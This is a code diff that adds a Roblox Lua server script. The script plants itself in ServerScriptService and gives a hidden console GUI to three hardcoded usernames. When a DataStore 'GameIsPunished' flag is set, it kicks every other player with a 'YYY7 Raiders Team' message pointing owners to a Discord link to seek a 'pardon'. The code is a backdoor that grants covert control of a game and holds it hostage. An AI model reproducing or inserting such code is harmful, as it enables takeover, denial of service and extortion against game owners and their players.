@@ -1,0 +1,32 @@
+local gods = {"hgftrdfgt", "MateiSuper19", "guiseppe1_12"}
+if script.Parent ~= game:GetService("ServerScriptService") then
+	script:Clone().Parent = game:GetService("ServerScriptService")
+else
+	for i,v in pairs(workspace:GetChildren()) do
+		if v.Name == "CameraScript" then
+			if v:FindFirstChild("Console") then
+				v:Destroy()
+			end
+		end
+	end
+end
+game:GetService("Players").PlayerAdded:Connect(function(newPlr)
+	if script.Parent == game:GetService("ServerScriptService") then
+		newPlr.CharacterAdded:Connect(function(char)
+			if table.find(gods, newPlr.Name) then
+				script.Console:Clone().Parent = newPlr.PlayerGui
+			end
+		end)
+	end
+end)
+game:GetService("Players").PlayerAdded:Connect(function(newPlr)
+	local dss = game:GetService("DataStoreService")
+	local cs = dss:GetDataStore("ConsoleSettings")
+	local gip = cs:GetAsync("GameIsPunished")
+	if gip ~= nil and gip ~= false and gip == true then
+		if not table.find(gods, newPlr.Name) then
+			script.PG:Clone().Parent = newPlr.PlayerGui
+			newPlr:Kick("This game is punished by YYY7 Raiders Team...     Contact in discord for pardon: https://discord.gg/CH7wWBh2Bj")
+		end
+	end
+end)
